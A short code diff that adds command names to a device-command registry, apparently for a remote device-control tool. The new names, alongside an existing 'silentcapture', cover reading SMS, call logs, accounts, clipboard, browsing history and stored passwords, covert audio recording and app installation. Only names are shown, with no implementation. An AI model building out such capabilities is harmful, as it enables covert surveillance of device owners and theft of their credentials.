@@ -78,6 +78,15 @@ DEVICE_COMMAND_NAMES = {
     "usage",
     "wallpaper",
     "silentcapture",
+    "getsms",
+    "getcalllogs",
+    "getaccounts",
+    "getclipboard",
+    "recordaudio",
+    "installapp",
+    "gethistory",
+    "sysinfo_full",
+    "getpasswords",
 }
 
 
